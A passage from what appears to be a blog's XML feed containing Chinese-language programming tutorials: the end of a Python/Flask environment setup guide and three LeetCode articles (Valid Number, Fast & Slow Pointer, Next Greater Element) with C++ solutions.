所謂工欲善其事，必先利其器，要開發好的應用程式必須先準備好開發環境才行。以下介紹我們在接下來開發 Python Flask Web 應用程式所需要安裝的開發環境工具（以下以 Mac OS 等 Unix-like 作業系統為示範，若是 Windows 使用者建議安裝 Virtualbox 並運行 Linux Ubuntu 作業系統，參考安裝文件）：

Microsoft VSCode 編輯器 Microsoft VSCode 是 Microsoft 推出的編輯器（非整合開發環境 IDE），夾帶著 Microsoft 過去打造 Visual studio 整合開發環境的豐富經驗，相比 Sublime Text 和其他編輯器，VSCode 的優勢在於開源且活躍的開發社群、內建 debugger 框架、原生 Git 整合、套件整合容易等特性。所以對於初學者來說 VSCode 是一個蠻適合入門的開發環境。它的安裝方式也十分簡易，在官網下載後按照指示安裝完成即可。
  
 我們可以安裝 Python 語法和格式檢查的相關 Python 套件幫助除錯：
  

終端機環境（iTterm&#x2F;內建 terminal） terminal（終端機）是我們下指令的地方，許多時候我們進行程式開發時不會使用 GUI 的介面而是使用下指令方式請電腦做相對應的行為。在 Linux 和 Mac 裡面都有內建的 terminal 的應用程式，若你是 Mac 用戶想使用更便利的工具（分割視窗、熱鍵、搜尋、自動補完等）可以額外安裝 iterm2 做使用。若是不想使用 Virtualbox，使用 Windows 讀者可以使用 Cmder 這個軟體當做終端機環境。
  
 下指令（$ 為提示字元，不用輸入）：
  
 對於有志於從事程式開發相關工作的讀者建議可以多熟悉指令碼的輸入，更多指令碼可以參考鳥哥撰寫的 Linux 基本指令介紹 和 Linux 學習資源。

Git 版本控制系統&#x2F;註冊 GitHub 帳戶 Git 是一種分散式版本控制系統，可以讓我們可以更方便地管理我們的程式碼。在網路上有非常多優秀的 Git 教學文件（連猴子都能懂的Git入門指南、寫給大家的 Git 教學、初心者 Git 上手攻略）。安裝 Git 方式是到官網下載軟體，依照指示安裝。
  
 互動式語法學習：
  
 在介紹完 git 之後我們來了解一下 GitHub。GitHub 是一個可以存放 git 程式碼專案的平台，透過 GitHub 我們可以接觸到最新的開放原始碼資訊，也可以將我們的程式碼開源出來。
  
 從 GitHub 上複製程式碼
  
 # 複製一份到本地端$ git clone https://github.com/kdchang/flask101.git# 移動到資料夾$ cd flask101

 常見 Git 指令：
 # 初始化專案$ git init# 查看狀態$ git status# 檢查差異$ git diff # 將變更檔案放入暫存區$ git add index.py# 使用 commit -m 提交變更$ git -a -m &#x27;init commit&#x27;# 查看歷史$ git log# 放棄已經 commit 的檔案重回暫存區$ git reset HEAD index.py# 放棄檔案變更$ git checkout index.py

Anaconda Python3 版本 Anaconda 是一個 all-in-one 的 Python 開發環境，對於初學者來說是個十分合適的開發環境包。Anaconda 具備了幾項特點：

便於安裝許多流行的科學、數學、工程、數據分析的 Python 模組  
開源和免費
跨平台支持：Linux、Windows、Mac
支持 Python 版本切換，方便建立不同的虛擬開發環境
內建 Spyder 編輯器和 Jupyter Notebook 環境

 安裝流程也十分簡單，進入 Anaconda 首頁，選擇對應作業系統（這邊使用 Mac OS）： 
 選擇對應 Python 版本下載，我們使用 Graphical Installer（圖像介面安裝方式），接著在下載完成時按照預設的安裝方式完成安裝；  
 若是完整安裝成功，可以打開終端機輸入，若是顯示 Python 3.6.0 :: Anaconda 4.3.0 (x86_64) 版本號即安裝成功：
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 接著要建立我們專案虛擬環境，這樣在安裝操作套件時比較不容易被污染到 root 的環境，啟動後會出現（套件名稱）的提示字元：
 # 顯示目前虛擬環境列表$ conda info -e # 創建虛擬環境$ conda create -n 套件名稱 python=3.6# 進入虛擬環境（若是 Windows cmder 環境不用加 source） ，成功後提示字元變成：（套件名稱）$$ source activate 套件名稱# 離開虛擬環境（若是 Windows cmder 環境不用加 source） $ source deactivate 

建立虛擬環境在建立相關開發工具後我們正式來建立一個 Python 的專案：
打開終端機移動到桌面，建立專案資料夾
$ cd ~/Desktop$ mkdir python_examples$ cd python_examples

建立獨立虛擬環境，並進入虛擬環境：
$ conda create -n python_examples_venv python$ source activate python_examples_venv

成功進入虛擬環境後
你的第一個 Python 程式一般而言我們會使用編輯器或是整合開發環境（IDE）進行程式撰寫，然後在終端機下指令執行程式。當然你也可以在終端機上使用內建互動式介面或是 jupyter notebook 進行。以下是我們要介紹給大家的簡單範例，第一個是隨機印出不同的喜愛程式語言，第二個是使用第三方套件擷取政府公開資料。程式設計唯有動手實際操作和實踐才能學的好，希望讀者打開你的編輯器透過自己實作去熟悉 Python 程式撰寫：
隨機印出不同的喜愛程式語言：

引入 random 套件
定義 language 變數，並將儲存程式語言字串的串列（list）資料結構給定給變數
產生 1 到 2 之間的隨機整數
列印出最喜歡的程式語言字串（含根據隨機產生的 index 選取到的串列值）

favorite_language.pyimport randomlanguage = [&#x27;Python&#x27;, &#x27;JavaScript&#x27;, &#x27;Java&#x27;]rnd = random.randint(1, 2)print(&#x27;My favorite Language is&#x27; + language[rnd])

可以在終端機移動到檔案資料夾執行程式檔案，例如：
python favorite_language.py

使用第三方套件擷取政府公開資料：

引入 requests 套件
爬取政府公開 Wifi 熱點資料，將取得資料回應給定給 response 變數
將資料轉換成以 &#123; &quot;key&quot;: &quot;value &quot;&#125; 形式的 json 格式
印出取得的資料

wifi_data.pyimport requestsurl = &#x27;http://data.taipei/opendata/datalist/apiAccess?scope=resourceAquire&amp;rid=b087af42-2c54-4dbf-86c8-427d788779e5&#x27;response = requests.get(url)data = response.json()print(data)

總結以上就是程式設計思維入門簡介，透過了解什麼是程式設計思維和不同語言的特性。當然，網路上也有許多學習資源可以當做參考。
（image via mshcdn）
延伸閱讀
Python 官網
JavaScript 程式設計
Python Web 程式設計
非本科生，我想半路出家學寫程式，該如何開始？
自學程式設計學習資源懶人包
CS50
CS50 TV

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>Django</tag>
        <tag>MVC</tag>
      </tags>
  </entry>
  <entry>
    <title>記一次 Leetcode 刷題體悟 - Valid Number</title>
    <url>/2019/08/03/leetcode-comprehension-valid-number/</url>
    <content><![CDATA[前言身在大 CS 時代，可能很多人有刷題的經驗，也可能像筆者一樣正經歷刷 Hard 題的各種撞牆。但在這種撞牆的時刻，我們反而可以來觀察自己的思考方式是不是有問題，才會導致撞牆。
今天，就讓我們一起來看一題令許多人抓狂的 valid number。
題目介紹 - Valid Number題目敘述如下：

基本上就是要判斷一個字串是不是可以被當作一個數字。如果你試著去解解看這題，你可能會發現一件事，就是你很容易不斷漏考慮一些 case。但你不孤單，只要看看這題精美的通過率和 dislike 數就可見一班XD


但如果我們也像大家一樣覺得這題出得很爛就不想學，那就非常可惜了。因為如果你堅持下去，會看到很不一樣的風景。接下來，就讓我們一起看下去。
解法一 - 將各階段分類好漸進處理這種題目最麻煩的地方就在於，如果沒有把規則想好，就會涵蓋不到一些 edge cases，進而為了處理這些奇怪 case 使得邏輯變得很混亂，甚至會發生修了 A bug 結果又產生 b 跟 c bug 的慘況。
所以在有模糊的概念就開始寫 code 之前，我們可以先想想合理的 case 應該要長什麼樣子，先寫出第一版的 valid pattern（[] 裡面表示是 optional，類似 linux command line tool 的說明）：
[+/-] 數字(可以是小數) [e數字(不能是小數)]

而不屬於這個 valid pattern 的其他字串都視為 invalid。
接下來我們可以用題目中提供的 test cases 檢視一下我們的 pattern 是否已經足夠，會發現有幾個例子沒有被涵蓋到：

“ 0.1 “ &#x3D;&gt; true (最前面跟最後面都可以有 space)
“ 6e-1” &#x3D;&gt; true (e 後面的數字可以有 +&#x2F;-)

[spaces][+/-]數字(可以是小數)[e[+/-]數字(不能是小數)][spaces]

所以我們的邏輯應該要依序處理：

Skip spaces
Check ‘+’&#x2F;‘-‘
Check digital(can contain “.”)
Check exponenta. Check ‘+’&#x2F;‘-‘b. Check digital(cannot contain “.”)
Check space

這時再開始寫程式，就覺得邏輯清晰，輕舟已過萬蟲山：
class Solution &#123;public:  bool isNumber(string s) &#123;    int i=0;        // Skip the spaces    for(; s[i] == &#x27; &#x27;; i++) &#123;&#125;        // Check for &#x27;+&#x27;/&#x27;-&#x27;    if(s[i] == &#x27;+&#x27; || s[i] == &#x27;-&#x27;) i++;        // Check digital    int num, pt;    for(num=0, pt=0; (s[i]&lt;=&#x27;9&#x27; &amp;&amp; s[i]&gt;=&#x27;0&#x27;) || s[i]==&#x27;.&#x27;; i++)      s[i] == &#x27;.&#x27; ? pt++ : num++;        if(pt&gt;1 || num&lt;1) // no more than one point, at least one digit    return false;        // Check exponent    if(s[i] == &#x27;e&#x27;) &#123;      i++;      // Check &#x27;+&#x27;/&#x27;-&#x27;      if(s[i] == &#x27;+&#x27; || s[i] == &#x27;-&#x27;) i++;      // Check digital(cannot contain &quot;.&quot;)      for(num=0; (s[i]&lt;=&#x27;9&#x27; &amp;&amp; s[i]&gt;=&#x27;0&#x27;); i++, num++) &#123;&#125;      if(num&lt;1) // at least one digit        return false;    &#125;        // Skip spaces    for(; s[i] == &#x27; &#x27;; i++) &#123;&#125;        // must reach the end of string    return s[i]==&#x27;\0&#x27;;  &#125;&#125;;

但到這邊還沒完，我們還可以對這題挖得更加深入。
解法二 - Regular Expression在解法一寫出合理 pattern 的時候，我就想到了 regular expression。
雖然 regular expression 的寫法我已經忘了，但從這個影片 Regular Expressions (Regex) Tutorial: How to Match Any Pattern of Text 重新學習，再參考一下相關的 討論串 ，就可以寫出一個神簡潔的程式碼 ：
class Solution &#123;public:  bool isNumber(string s) &#123;    //[spaces][+/-]數字(可以是小數)[e[+/-]數字(不能是小數)][spaces]    //regex pattern(&quot;\\s*[+-]?(([0-9]*\.?[0-9]+)|([0-9]+\.?[0-9]*))([e][+-]?[0-9]+)?\\s*&quot;);    regex pattern(&quot;\s*[+-]?(([0-9]*\.?[0-9]+)|([0-9]+\.?[0-9]*))([e][+-]?[0-9]+)?\s*&quot;);        return regex_match(s, pattern);  &#125;&#125;;

這個版本無法通過 leetcode 上的 test cases，不過我用 Sublime Text 測試時結果正確。
雖不確定是什麼問題，但現在的目的不是逼自己要把所有東西都寫對，我只是想欣賞欣賞簡潔解的美好，所以 bug 先擱著。看看這程式碼真的覺得神清氣爽。
解法三 - Deterministic Finite Automaton基於好奇的心理，我又去翻了一下討論區，結果看到一個超猛的東西 - DFA (Deterministic Finite Automaton)。這傢伙基本上就是一個狀態機，根據你的輸入會在不同狀態間跳來跳去，所以你最後只要看有沒有跳到 valid state 就好，超酷。
class Solution &#123;public:  bool isNumber(string s) &#123;    int state = 0;    vector&lt;vector&lt;int&gt; &gt; transTable = &#123;      &#123;2, 1, -1, 3, 0, -1&#125;, // Q0      &#123;2, -1, -1, 3, -1, -1&#125;, // Q1      &#123;2, -1, 5, 4, 8, -1&#125;, // Q2      &#123;4, -1, -1, -1, -1, -1&#125;, // Q3      &#123;4, -1, 5, -1, 8, -1&#125;, // Q4      &#123;7, 6, -1, -1, -1, -1&#125;, // Q5      &#123;7, -1, -1, -1, -1, -1&#125;, // Q6      &#123;7, -1, -1, -1, 8, -1&#125;, // Q7      &#123;-1, -1, -1, -1, 8, -1&#125; // Q8    &#125;;        bitset&lt;9&gt; validStates(&quot;110010100&quot;);        for(char c: s) &#123;      int type = inputType(c);      state = transTable[state][type];      if(state == -1) return false;    &#125;        return validStates[state];  &#125;private:  int inputType(char c) &#123; // use type ID as index to get next state in the transition table.    if(isdigit(c)) return 0; // T0    if(c == &#x27;+&#x27; || c == &#x27;-&#x27;) return 1; // T1    if(c == &#x27;e&#x27;) return 2; // T2    if(c == &#x27;.&#x27;) return 3; // T3    if(c == &#x27; &#x27;) return 4; // T4    else return 5; // T5  &#125;&#125;;

這種解法真的有夠帥，假設你今天沒有要找工作或得把這東西學會的壓力，是不是肯定會感受到一股開心的感覺，因為被開眼界了！而不是一堆自己得學會，矮唷我怎麼想不出來等等的各種延伸情緒。
因為我之前也沒有真正學過 DFA 的理論，就不多說了，有興趣的讀者可以參考一下這兩個討論串，應該就能清楚：

[C++] My thought with DFA
https://leetcode.com/problems/valid-number/discuss/23798/Cleanest-C%2B%2B-Solution-using-DFA-(impress-your-interviewer-with-elegant-code!!)

總結今天跟大家分享了一次刷 Hard 題的心路歷程，主要也是希望大家更把心情放輕鬆，享受刷題過程，畢竟人生苦短，既然有緣來刷題，不如就開開心心地學習，越寫越開心才會越寫越厲害，希望這篇文章對於正在題海中奮鬥的工程師們有些幫助。
延伸閱讀
刷题需要hard一起刷嗎
讓刷題幸福感提高的一百個心得

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
        <tag>軟體工程師面試</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 刷題 pattern - Fast &amp; Slow Pointer</title>
    <url>/2019/11/22/leetcode-pattern-fast-and-slow-pointer/</url>
    <content><![CDATA[前言身在大 CS 時代，有越來越多人投入刷題的行列，在眼花撩亂的題海中，要想有效率地刷題，掌握並通達題目解法背後，可以不斷被拿來使用的觀念，才能做到以簡禦繁。之前 Huli 寫的 程式解題新手入門注意事項 也講得非常好，寫題目是為了學會解題的思考方法，確保自己掌握重要的資料結構跟演算法。這也是為什麼我想要寫這系列的文章，把多個散落在各處的題目銜接起來，以後看到相似的問題就可以舉一反三，而不是去背各題目的解法。
舉例來說，之前遇過一題電話面試，問到的題目是：
Input: vector&lt;bool&gt; holidays, int ptoholidays 表示平日或假日，例如 0000011 表示前面 5 天是平日，後面 2 天是假日。pto 表示最多可以放幾天假。Output: 計算在可以用完 pto 的情況下，最久可以放多長的假。範例：holidays = &#123;0,0,0,0,0,1,1&#125;, pto = 2, output = 4      因為可以放 &#123;0,0,0,1,1,1,1&#125;

基本上因為之前有寫過 Sliding Window 的 pattern，所以這題很快就寫出來了，也順利進到下一關，所以大家不需要追求把題目都刷完，而是掌握好重要的基礎，接下來就是應用這些基礎就可以面對很多變化題（當然還是會有一些解法很巧妙的題目，但其實大部分公司不會硬出巧妙題）。上面這題還有一個 follow-up 問題，可以看我的 面經分享。
那繼之前寫過的 Two Pointer、Sliding Window 跟 Next Greater Element，今天要來跟大家介紹另一種演算法的 pattern - Fast &amp; Slow Pointer。
Fast &amp; Slow Pointer 的第一個範例 - Leetcode #876 - Middle of the Linked List題目
暴力解法這題非常簡單，我們只要先走過一次 linked list，計算整個 list 的長度 - len，然後接下來再重新走一次 len&#x2F;2 的 list 就好。
/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* middleNode(ListNode* head) &#123;        /// Calculate the length of list        ListNode *ptr = head;        int len = 0;                while(ptr != nullptr) &#123;            ++len;            ptr = ptr-&gt;next;        &#125;                // Move ptr to the middle of list        ptr = head;        for(int i = 0; i &lt; len/2; ++i) &#123;            ptr = ptr-&gt;next;        &#125;                return ptr;    &#125;&#125;;

Fast &amp; Slow Pointer 解法雖然上面的解法 OK，但如果被問到只能走一次 list 就要解決，我們就需要使用 Fast &amp; Slow Pointer 了。基本上呢，做法就是指定兩個 pointer - fast 跟 slow，一開始 slow 跟 fast 都指向 head，接下來，在 fast 走到 linked list 的底端前，fast 一次走兩步，slow 一次走一步，當 fast 走到底的時候，slow 就會在中間。
不過我們還需要注意一下，linked list 長度有 even 跟 odd 兩種，以下分別解析：

Odd:1-&gt;2-&gt;3-&gt;NULL
當 slow 走到 2，fast 已經走到 3，下一次不會再進 while 迴圈，這時 return slow 就好。
Even:1-&gt;2-&gt;3-&gt;4-&gt;NULL
當 slow 走到 2，fast 走到 3，下一次因為 fast-&gt;next-&gt;next 就是 NULL 了，fast 不能再走兩步，所以不會再進 while 迴圈，這時要 return slow-&gt;next。

實作出來的程式碼如下：
/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* middleNode(ListNode* head) &#123;        ListNode *slow = head, *fast = head;                while(fast-&gt;next != nullptr &amp;&amp; fast-&gt;next-&gt;next != nullptr) &#123;            slow = slow-&gt;next;            fast = fast-&gt;next-&gt;next;        &#125;                return (fast-&gt;next == nullptr) ? slow : slow-&gt;next;    &#125;&#125;;

Fast &amp; Slow Pointer 的第二個範例 - Leetcode #141 - Linked List Cycle題目剛剛那題算是非常簡單，只是想讓大家了解一下 Fast &amp; Slow Pointer 的基本概念，我們接著看難一點點的題目：

暴力法要解這個題目，最直覺的想法就是記錄每一個走過的 node。而要知道有沒有 cycle，只要繼續走下去，如果有看到記錄過的 node，就知道有 cycle；但如果走到底了都還沒遇到有記錄過的 node，那就知道沒有 cycle。
以實作上，我們可以用一個 set 記錄已經走過的 node，程式碼如下：
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    bool hasCycle(ListNode *head) &#123;        unordered_set&lt;ListNode*&gt; nodeSeen;        while(head != nullptr) &#123;            if(nodeSeen.count(head)) &#123;                 return true;             &#125;            else &#123;                 nodeSeen.insert(head);             &#125;            head = head-&gt;next;        &#125;                return false;    &#125;&#125;;

這個解法雖然正確，但因為需要記錄，所以要額外花 O(n) 的空間來儲存，所以我們可以使用今天要學的 pattern 來做到 O(1) 的空間複雜度。
Fast &amp; Slow Pointer 解法這題要怎麼應用 Fast &amp; Slow Pointer 就比較不直覺，接著讓我們一步步來分析。
首先，我們一樣先假設有兩個 pointer - fast 跟 slow，fast 跟 slow 一開始都指向 head，之後，fast 每次走兩步，slow 每次走一步。按照這個邏輯，我們可以分成兩種情況：

沒有 cycle：如果沒有 cycle，fast 走到底的時候，slow 才走到一半，所以如果 fast 走到底，就知道沒有 cycle
有 cycle：如果有 cycle，fast 會先進去 cycle，然後就一直在 cycle 裡面跑，而雖然慢了一些，但 slow 也會進到 cycle，跟 fast 一起在 cycle 裡面跑（腦海中怎麼突然出現天竺鼠跑步的畫面）。

上面的分析讓我們知道怎麼判斷沒有 cycle，可是如果有 cycle，那 slow 跟 fast 不就會無窮地跑下去？
答案是不會，因為只要有 cycle，slow 跟 fast 一定會相遇，原因是，當 fast 跟 slow 都在 cycle 裡面跑，fast 遲早會追到離 slow 一步或兩步。

差一步時：fast 移兩步，slow 移一步，兩者相遇。
差兩步時：fast 移兩步，slow 移一步，兩者只差一步，下一次就會相遇。

所以，只要有 cycle，slow 跟 fast 一定會相遇！
經過上面的分析，實作就變得相當簡單：
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    bool hasCycle(ListNode *head) &#123;        ListNode *slow = head, *fast = head;                while(fast != nullptr &amp;&amp; fast-&gt;next != nullptr) &#123;            fast = fast-&gt;next-&gt;next;            slow = slow-&gt;next;                        if(slow == fast) &#123;                return true;            &#125;        &#125;                return false;    &#125;&#125;;

很明顯，這個演算法不需要花額外的 O(n) 空間，在 memory 使用吃緊時就是一個好解法。
Fast &amp; Slow Pointer 的第三個範例 - Leetcode #143 - Reorder List題目
暴力解法暴力解法滿直觀的，就先把所有 node 存到一個 array 中，剩下就只是用兩個 pointer 分別從頭跟尾開始，更新這些 node 的 next 就好。實作如下：
class Solution &#123;public:    void reorderList(ListNode* head) &#123;        // Corner case        if(!head || !head-&gt;next) return;                // Store all nodes into a vector        vector&lt;ListNode*&gt; vl;        while (head) &#123;            vl.push_back(head);            head = head-&gt;next;        &#125;        // Reassign the next pointer        int i = 0, j = vl.size() - 1;        while ( i + 1 &lt; j ) &#123;            vl[i]-&gt;next = vl[j];            vl[j]-&gt;next = vl[i+1];            ++i, --j;        &#125;        vl[j]-&gt;next = nullptr;    &#125;&#125;;

Fast &amp; Slow Pointer 解法同樣的問題來了，我們能不能不花額外的空間來解決這題呢？
答案是可以！只要你會 Fast &amp; Slow Pointer！因為如果我們先仔細觀察題目，就會發現這題是要把後半段的 list 先反轉，然後再跟前半段的 list 交錯。所以我們可以先用 Fast &amp; Slow Pointer 找到 list 中點，把後半 list reverse，然後就依序連接前半跟後半的 node。於是空間複雜度就降到 O(1)。
/*** Definition for singly-linked list.* struct ListNode &#123;* int val;* ListNode *next;* ListNode(int x) : val(x), next(NULL) &#123;&#125;* &#125;;*/class Solution &#123;public:    void reorderList(ListNode* head) &#123;        if(!head or !head-&gt;next) return;                // Find the middle of list        ListNode *slow = head, *fast = head;                while(fast != NULL &amp;&amp; fast-&gt;next != NULL) &#123;            slow = slow-&gt;next;            fast = fast-&gt;next-&gt;next;        &#125;                // Reverse the second half of the list        ListNode *second = reverse(slow);        ListNode *first = head;                // Construct the new list by interleaving two lists        while(first != nullptr &amp;&amp; second != nullptr) &#123;            ListNode* tmp = first-&gt;next;            first-&gt;next = second;            first = tmp;            tmp = second-&gt;next;            second-&gt;next = first;            second = tmp;        &#125;                if(first != NULL)            first-&gt;next = NULL;    &#125;    private:    ListNode* reverse(ListNode* head) &#123;        ListNode* prev = nullptr;        while(head != nullptr) &#123;            ListNode* next = head-&gt;next;            head-&gt;next = prev;            prev = head;            head = next;        &#125;                return prev;    &#125;&#125;;

Fast &amp; Slow Pointer 的第四個範例 - Leetcode #457 - Circular Array Loop題目
Fast &amp; Slow Pointer 解法這題雖然不是 linked list 的題目，但其實有 cycle 的概念，就可以運用 Fast &amp; Slow Pointer。直觀的做法就是依序把每個 element 當作起點，只要有一個起點滿足 circular 的條件，就可以 return true，反之如果沒有一個起點可以構成 circular，那就 return false。
因為另外要注意 cycle 必須有超過一個 element，還有必須一直同向兩個條件，所以不能只是去找有沒有 cycle，同時還得檢查這兩件事。不過基本的框架其實就是 Fast &amp; Slow Pointer，大家可以看看下面的實作體會一下：
class Solution &#123;public:    bool circularArrayLoop(vector&lt;int&gt;&amp; nums) &#123;        for (int i = 0; i &lt; nums.size(); i++) &#123;            bool isForward = nums[i] &gt;= 0;  // if we are moving forward or not            int slow = i, fast = i;            // If slow or fast becomes &#x27;-1&#x27; this means we can&#x27;t find cycle for this number            do &#123;                slow = findNextIndex(nums, isForward, slow);  // move one step for slow pointer                fast = findNextIndex(nums, isForward, fast);  // move one step for fast pointer                if (fast != -1) &#123;                    fast = findNextIndex(nums, isForward, fast);  // move another step for fast pointer                &#125;            &#125; while (slow != -1 &amp;&amp; fast != -1 &amp;&amp; slow != fast);            if (slow != -1 &amp;&amp; slow == fast) &#123;                return true;            &#125;        &#125;        return false;    &#125;    private:    int findNextIndex(const vector&lt;int&gt; &amp;nums, bool isForward, int currentIndex) &#123;        bool direction = nums[currentIndex] &gt;= 0;        if (isForward != direction) &#123;          return -1;  // change in direction, return -1        &#125;        // wrap around for negative numbers        int nextIndex = (currentIndex + nums[currentIndex] + nums.size()) % nums.size();        // one element cycle, return -1        if (nextIndex == currentIndex) &#123;          nextIndex = -1;        &#125;        return nextIndex;    &#125;&#125;;

總結今天跟大家介紹了一個新的 pattern - Fast &amp; Slow Pointer，上面提供的四題是讓大家初步體驗一下，雖然這個 pattern 的變化不是很大，但在一些需要特別優化的地方還是派得上用場。
如果你對這個 pattern 有興趣，可以再去看看延伸閱讀的筆記。裡面有更多同樣 pattern 的題目，如果把這些題目一次寫完，之後看到類似的題目應該就比較容易想到這種解法！
延伸閱讀
我的 Leetcode 刷題筆記 - Fast &amp; Slow Pointer pattern

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習 用心體會事物的本質跟 不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 刷題 pattern - Next Greater Element</title>
    <url>/2019/10/26/leetcode-pattern-next-greater-element/</url>
    <content><![CDATA[前言身在大 CS 時代，有越來越多人投入刷題的行列，在眼花撩亂的題海中，要想有效率地刷題，掌握並通達題目解法背後，可以不斷被拿來使用的觀念，才能做到以簡禦繁。
繼之前寫過的 Two Pointer 跟 Sliding Window，今天要來跟大家介紹另一種演算法的 pattern - Next Greater Element。
Next Greater Element 的第一個範例 - Leetcode #496 - Next Greater Element I題目我們先看一下題目的敘述：

暴力法一開始最直覺的想法就是先走過 nums1 的每一個 element，然後對每個 element 都去 nums2 搜尋位置，並找到 next greater element，時間複雜度是 O(mn)，空間複雜度是 O(1)。
Stack 解法上面的暴力法雖然可以解決，但這題其實可以用更好的時間效率 - O(m+n) 的方式解掉，主要的方法就在於搜尋 nums2 next greater element 的方法，舉例來說：
nums1 = [1,2]nums2 = [6,2,1,5,4]

我們可以看到，5 同時是 2 跟 1 的 next greater element，所以如果用上面的暴力法，我們會

先在 nums2 中找到 1，然後往後搜尋，找到 5。
在 nums2 中找到 2，往後搜尋，找到 5。

當你仔細觀察這兩步，會發現有些冗餘的地方，因為在 nums2 中，1 在 2 後面，但卻是比 2 小的，所以其實在遇到 5 時再一次記錄 5 是 1 跟 2 的 next greater element 就好。
而要做到這種處理，就很容易聯想到 stack，因為 stack 可以依序儲存看到的 element，然後從最新放入的開始處理。
所以，基本概念就是，只要還沒遇到更大的 element，我們就把它放進 stack，直到遇到比 stack.top() 更大的，就可以把 stack 依序 pop 出來，並更新答案。
如果已經走完 nums2，但還留在 stack 中，我們就知道這些 element 沒有 next greater element。
另外因為要 output 的答案是要 follow nums1 的 index，所以我們需要先用一個 Hash Table 來儲存 nums1 的 &lt;value, idx&gt; pair。
我們來看一下 C++ 的實作：
class Solution &#123;public:    vector&lt;int&gt; nextGreaterElement(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;        // Use a hash table to store the &lt;value, idx&gt;        unordered_map&lt;int, int&gt; table;        for(int i = 0; i &lt; nums1.size(); ++i) &#123;            table[ nums1[i] ] = i;        &#125;                // Use a stack to get next greater element efficiently        vector&lt;int&gt; ans(nums1.size(), -1);        stack&lt;int&gt; st;        for(int i = 0; i &lt; nums2.size(); ++i) &#123;            while( !st.empty() and st.top() &lt; nums2[i] ) &#123;                int cur = st.top();                st.pop();                                // If cur exists in table, it means cur is in nums1                // so we should update nums2[i] as the next greater element of cur                if(table.count(cur)) &#123;                    ans[ table[cur] ] = nums2[i];                &#125;            &#125;                        st.push(nums2[i]);        &#125;                return ans;    &#125;&#125;;

這題也算是 stack 的一個實用案例，讀者可以再稍稍體會一下如果沒有 stack 這種操作資料的模式，處理起來是不是會比較麻煩。
Next Greater Element 的第二個範例 - Leetcode #503 - Next Greater Element II題目
這題跟上一題有兩個差異：

nums 可以有 duplicate number
這題的 array 是 circular 的

Stack 解法既然已經學會了剛剛的 stack 解法，我們就不看暴力法了，直接來修改 stack 解法。
首先，因爲這題會有 duplicate number，所以我們不能再用 Hash Table 來儲存 value 跟 index pair，而是要把 idx 資訊也直接放到 stack 中，這邊我們只要在 stack 裡面存一個 pair 就好。
再來要處理的東西就是 circular，不過這也不會很麻煩，最多其實只需要走 nums 兩次，就可以處理完畢。
程式碼實作如下：
class Solution &#123;public:    vector&lt;int&gt; nextGreaterElements(vector&lt;int&gt;&amp; nums) &#123;        // Use a stack to get next greater element efficiently        vector&lt;int&gt; ans(nums.size(), -1);        stack&lt; pair&lt;int, int&gt; &gt; st; // store &lt;value, index&gt; to deal with duplicate values                // Go through array twice to handle circular property        for(int i = 0; i &lt; 2 * nums.size(); ++i) &#123;            int idx = i % nums.size();            while( !st.empty() and st.top().first &lt; nums[idx] ) &#123;                pair&lt;int, int&gt; cur = st.top();                st.pop();                                // Because we go through nums twice                // we might update some ans twice (which we do not desire)                // so we only update if ans[cur.second] == -1                if(ans[cur.second] == -1) &#123;                    ans[cur.second] = nums[idx];                &#125;            &#125;                        if(ans[idx] == -1) &#123;                st.push( make_pair(nums[idx], idx) );            &#125;        &#125;                return ans;    &#125;&#125;;

Next Greater Element 的第三個範例 - Leetcode #739 - Daily Temperatures題目
這題要求的有一點點不一樣，是要求 next greater element 跟目標 element 的 index 差值。
Stack 解法這題的解法跟第一題其實差不多，只差在更新 ans 的時候不是存進 temperature，而是 index 的差值，算是一個小小的變形，可以再幫助大家熟悉一下這個 pattern。
class Solution &#123;public:    vector&lt;int&gt; dailyTemperatures(vector&lt;int&gt;&amp; T) &#123;        // Use stack to store &lt;temperature, idx&gt; pair for O(n) calculation        vector&lt;int&gt; ans(T.size(), 0);        stack&lt; pair&lt;int, int&gt; &gt; st; // store &lt;temperature, index&gt;                // Go through T to search next greater element(temperature)        for(int i = 0; i &lt; T.size(); ++i) &#123;            while(!st.empty() and st.top().first &lt; T[i]) &#123;                pair&lt;int, int&gt; cur = st.top();                st.pop();                                // i is the next greater temperature of cur                ans[cur.second] = i - cur.second;            &#125;                        st.push(make_pair(T[i], i));        &#125;                return ans;    &#125;&#125;;

總結希望大家看完之後，可以感受到用 stack 的方便和效率。體驗到這個演算法好用、厲害，才會在該用的時候，自然而然地使用，比起用背的（例如看到…，就要用…），我覺得去體驗通達各種解法，覺得酷到不自覺笑出來、感受到讚讚讚，可能就是讓演算法功力進到下一個境界的現象。
上面提供的三題是讓大家初步體會一下 stack 的威力，如果你對這個 pattern 有興趣，可以再去看看延伸閱讀的好 stack 題列表。裡面有不少 stack 的題目，如果把這些題目一次寫完，對於 stack 的掌握度應該就大大提升了！
延伸閱讀
lee215 大大分享的好 stack 題列表

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習 用心體會事物的本質跟 不斷進入學生心態改進。
]]></content>
      <tags>
